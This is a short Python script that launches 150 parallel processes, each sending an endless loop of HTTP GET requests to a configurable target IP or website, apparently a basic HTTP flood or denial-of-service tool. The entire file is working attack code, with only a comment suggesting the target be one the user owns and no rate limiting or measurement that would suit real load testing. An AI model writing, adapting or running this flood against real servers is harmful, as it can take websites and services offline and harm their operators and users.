import requests
from multiprocessing import Process

def send_request():
    target_ip = "127.0.0.1"  # Replace with the target IP address or you can replace it with a website url (which you own)
    while True:
        try:
            response = requests.get(f"http://{target_ip}")
            if response.status_code == 200:
                print("Requests successfully sent!")
            else:
                print("Mission unsuccessful.")
        except Exception as e:
            pass

if __name__ == "__main__":
    processes = []

    for _ in range(150):  # Adjust the number of processes as needed
        p = Process(target=send_request)
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
